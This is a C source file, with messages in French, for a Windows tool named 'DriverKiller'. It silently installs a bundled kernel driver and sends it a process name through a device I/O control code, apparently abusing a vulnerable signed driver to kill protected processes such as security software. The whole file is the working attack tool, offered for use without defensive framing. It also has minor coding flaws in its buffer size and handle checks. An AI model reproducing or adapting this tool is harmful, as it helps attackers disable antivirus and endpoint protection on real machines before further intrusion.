#include <stdio.h>
#include <windows.h>
#include "DriverKiller.h"

#define IOCTLCODE 0x82730030


int main(int argc, char* argv[]) {

	LPCWSTR serviceName = L"DriverKiller";
	wchar_t path[MAX_PATH] = L"";
	int delete = 0;

	if (argc < 2){
		printf("[i] Usage : %s Processus.exe [-d] ", argv[0]);
		return 1;
	}

	char *buffer = argv[1];

	for (int i = 2; i < argc; i++) {
		if (strcmp(argv[i], "-d") == 0) {
			delete = 1;
		}
	}

	if (!CheckDriver(serviceName)) {
		printf("[i] Driver non present sur le systeme, extraction du Driver en cours...\n");
		if (!ExtractDriver(path)) {
			printf("[!] Impossible d'extraire le Driver\n");
			return 1;
		}
		printf("[i] Installation et demarrage du Driver en cours...\n");
		if (!InstallAndStartDriver(path, serviceName)) {
			printf("[!] Impossible d'installer ou de demarrer le Driver\n");
			return 1;
		}
		printf("[i] Driver correctement installe !\n");
	}

	HANDLE hDriver = CreateFileA("\\\\.\\Viragtlt", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hDriver) {
		printf("[!] Impossible d'ouvrir le handle. Erreur : %lu\n", GetLastError());
		return 1;
	}

	printf("[i] Handle vers le Driver = OK\n");

	if (!DeviceIoControl(hDriver, IOCTLCODE, buffer, strlen(buffer) + 1, buffer, sizeof(buffer), NULL, NULL)) {
		printf("[!] Impossible d'envoyer DeviceIoControl. Erreur :%lu\n", GetLastError());
		return 1;
	}

	printf("[i] DeviceIoControl = OK\n");

	if (delete == 1) {
		if (!StopAndRemoveDriver(serviceName, path)) {
			printf("[!] Impossible de supprimer ou d'arreter le Driver\n");
			return 1;
		}
	}
	return 0;
}

